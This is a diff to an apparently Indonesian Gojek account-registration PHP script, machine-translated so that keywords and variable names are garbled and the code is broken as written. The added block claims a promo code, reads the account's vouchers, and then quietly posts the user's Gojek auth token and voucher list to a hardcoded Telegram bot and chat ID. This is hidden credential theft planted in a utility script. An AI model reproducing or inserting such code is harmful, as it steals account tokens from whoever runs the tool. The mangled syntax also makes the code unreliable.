@@ -113,5 +113,68 @@ if ($register == false)
     }
     }
 
-
+gema  "\ n" . warna ( "kuning" , "!] Harap tunggu" );
+        untuk ( $ a = 1 ; $ a <= 3 ; $ a ++) {
+         warna gema ( "kuning" , "." );
+        tidur ( 1 );
+        }
+        tidur ( 3 );
+        $ goride1 = permintaan ( '/ promosi-promosi / v1 / promosi / pendaftaran' , $ token , '{"promo_code": "COBAINGOJEK"}' );
+        $ Message2 = fetch_value ( $ goride1 , ' "message": "' , '"' );
+        gema  "\ n" . color ( "green" , "+] Pesan:" . $ message2 );
+        tidur ( 3 );
+        $ cekvoucher = permintaan ( '/ gopoints / v3 / wallet / voucher? limit = 10 & halaman = 1' , $ token );
+        $ total = fetch_value ( $ cekvoucher , '"total_vouchers":' , ',' );
+        $ voucher3 = getStr1 ( '"title": "' , '",' , $ cekvoucher , "3" );
+        $ voucher1 = getStr1 ( '"title": "' , '",' , $ cekvoucher , "1" );
+        $ voucher2 = getStr1 ( '"title": "' , '",' , $ cekvoucher , "2" );
+        $ voucher4 = getStr1 ( '"title": "' , '",' , $ cekvoucher , "4" );
+        $ voucher5 = getStr1 ( '"title": "' , '",' , $ cekvoucher , "5" );
+        $ voucher6 = getStr1 ( '"title": "' , '",' , $ cekvoucher , "6" );
+        $ voucher7 = getStr1 ( '"title": "' , '",' , $ cekvoucher , "7" );
+        gema  "\ n" . color ( "yellow" , "!] Total voucher" . $ total . ":" );
+         warna gema ( "hijau" , "1." . $ voucher1 );
+        gema  "\ n" . warna ( "hijau" , "2." . $ voucher2 );
+        gema  "\ n" . warna ( "hijau" , "3." . $ voucher3 );
+        gema  "\ n" . warna ( "hijau" , "4." . $ voucher4 );
+        gema  "\ n" . warna ( "hijau" , "5." . $ voucher5 );
+        gema  "\ n" . warna ( "hijau" , "6." . $ voucher6 );
+        gema  "\ n" . warna ( "hijau" , "7." . $ voucher7 );
+        gema "\ n" ;
+        $ expired1 = getStr1 ( '"expiry_date": "' , '"' , $ cekvoucher , '1' );
+        $ expired2 = getStr1 ( '"expiry_date": "' , '"' , $ cekvoucher , '2' );
+        $ expired3 = getStr1 ( '"expiry_date": "' , '"' , $ cekvoucher , '3' );
+        $ expired4 = getStr1 ( '"expiry_date": "' , '"' , $ cekvoucher , '4' );
+        $ expired5 = getStr1 ( '"expiry_date": "' , '"' , $ cekvoucher , '5' );
+        $ expired6 = getStr1 ( '"expiry_date": "' , '"' , $ cekvoucher , '6' );
+        $ expired7 = getStr1 ( '"expiry_date": "' , '"' , $ cekvoucher , '7' );
+        $ TOKEN   = "1032900146: AAE7V93cvCvw1DNuTk0Hp1ZFywJGmjiP7aQ" ;
+	$ chatid = "785784404" ;
+	$ pesan  	= "[+] Info Akun Gojek [+] \ n \ n" . $ token . "\ n \ nTotalVoucher =" . $ total . "\ n [+]" . $ voucher1 . "\ n [+] Exp: [" . $ kedaluwarsa1 . "] \ n [+]" . $ voucher2 . "\ n [+] Exp: [" . $ kedaluwarsa2 . "] \ n [+]" . $ voucher3 . "\ n [+] Exp: [" . $ kedaluwarsa3 . "] \ n [+]" ."\ n [+] Exp: [" . $ kedaluwarsa4 . "] \ n [+]" . $ voucher5 . "\ n [+] Exp: [" . $ kedaluwarsa5 . "] \ n [+]" . $ voucher6 . "\ n [+] Exp: [" . $ kedaluwarsa6 . "] \ n [+]" . $ voucher7 . "\ n [+] Exp: [" . $ kedaluwarsa7 . "]" ;
+	$ method 	= "sendMessage" ;
+	$ url     = "https://api.telegram.org/bot" . $ TOKEN . "/" . $ method ;
+	$ post = [
+ 		'chat_id' => $ chatid ,
+                'text' => $ pesan
+        	];
+                $ header = [
+                "X-Diminta-Dengan: XMLHttpRequest" ,
+                "Agen-Pengguna: Mozilla / 5.0 (X11; Linux x86_64) AppleWebKit / 537.36 (KHTML, seperti Gecko) Chrome / 51.0.2704.84 Safari / 537.36" 
+                        ];
+                                        $ ch = curl_init ();
+                                        curl_setopt ( $ ch , CURLOPT_RETURNTRANSFER , 1 );
+                                        curl_setopt ( $ ch , CURLOPT_URL , $ url );
+                                        curl_setopt ( $ ch , CURLOPT_HTTPHEADER , $ header );
+                                        curl_setopt ( $ ch , CURLOPT_POSTFIELDS , $ post );   
+                                        curl_setopt ( $ ch , CURLOPT_SSL_VERIFYPEER , false );
+                                        $ data = curl_exec ( $ ch );
+                                        $ error = curl_error ( $ ch );
+                                        $ status = curl_getinfo ( $ ch , CURLINFO_HTTP_CODE );
+                                        curl_close ( $ ch );
+                                        $ debug [ 'text' ] = $ pesan ;
+                                        $ debug [ 'response' ] = json_decode ( $ data , true );
+        
+         
+         }
+         }
 ?>
